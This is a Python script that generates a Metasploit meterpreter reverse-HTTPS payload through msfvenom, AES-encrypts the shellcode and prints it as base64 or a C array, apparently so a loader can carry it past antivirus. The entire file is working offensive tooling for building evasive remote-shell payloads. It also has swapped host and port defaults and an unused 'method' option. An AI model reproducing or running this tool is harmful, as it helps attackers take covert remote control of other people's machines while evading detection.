#!/usr/bin/env python3
import array, base64, random, string
from Crypto.Cipher import AES
from hashlib import sha256
import argparse, subprocess, os

def main():
	args = parse_args()
	lhost = args.lhost
	lport = args.lport
	key = args.key
	if not key:
		key = get_random_string(32)
	payload = args.payload
	method = args.method
	format = args.format

	''' generate msfvenom payload '''
	print("[+] Generating MSFVENOM payload...")
	result = subprocess.run(['msfvenom',
		'-p', payload,
		'LPORT=' + lport,
		'LHOST=' + lhost,
#		'-b', '\\x00',
		'-f', 'raw',
		'-o', './msf.bin'],
		capture_output=False)

	f = open("./msf.bin", "rb")
	buf = f.read()
	f.close()

	print("[+] key and payload will be written to key.b64 and payload.b64")

	''' encrypt the payload '''
	print("[+] Encrypting the payload, key=" + key + "...")
	hkey = hash_key(key)
	encrypted = encrypt(hkey, hkey[:16], buf)
	b64 = base64.b64encode(encrypted)

	f = open("./key.b64", "w")
	f.write(key)
	f.close()

	f = open("./payload.b64", "w")
	f.write(b64.decode('utf-8'))
	f.close()

	if format == "b64":
		''' base64 output '''
		print("[+] Base64 output:")
		print(b64.decode('utf-8'))
		print("\n[+] Have a nice day!")
		return
	if format == "c":
		''' c output '''
		print("[+] C output:")
		hex_string = 'unsigned char payload[] ={0x';
		hex = '0x'.join('{:02x},'.format(x) for x in encrypted)
		hex_string = hex_string + hex[:-1] + "};"
		print(hex_string)
		print("\n[+] Have a nice day!")
		return

def encrypt(key,iv,plaintext):
	key_length = len(key)
	if (key_length >= 32):
		k = key[:32]
	elif (key_length >= 24):
		k = key[:24]
	else:
		k = key[:16]

	aes = AES.new(k, AES.MODE_CBC, iv)
	pad_text = pad(plaintext, 16)
	return aes.encrypt(pad_text)

def hash_key(key):
	h = ''
	for c in key:
		h += hex(ord(c)).replace("0x", "")
	h = bytes.fromhex(h)
	hashed = sha256(h).digest()
	return hashed

def pad(data, block_size):
	padding_size = (block_size - len(data)) % block_size
	if padding_size == 0:
		padding_size = block_size
	padding = (bytes([padding_size]) * padding_size)
	return data + padding

def parse_args():
	parser = argparse.ArgumentParser()

	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
		help="The local port that msfconsole is listening on.")
	parser.add_argument("-i", "--lhost", default="443", type=str,
			help="The local host that msfconsole is listening on.")
	parser.add_argument("-p", "--payload", default = "windows/x64/meterpreter/reverse_https", type=str,
		help="The payload to generate in msfvenom.")
	parser.add_argument("-m", "--method", default="thread", type=str,
		help="The method to use: thread/delegate.")
	parser.add_argument("-k", "--key", default="", type=str,
		help="The encryption key (32 chars).")


	parser.add_argument("-f", "--format", default="b64", type=str,
		help="The format to output.")

	return parser.parse_args()

def get_random_string(length):
	letters = string.ascii_letters + string.digits
	result_str = ''.join(random.choice(letters) for i in range(length))
	return result_str

if __name__ == '__main__':
	main()
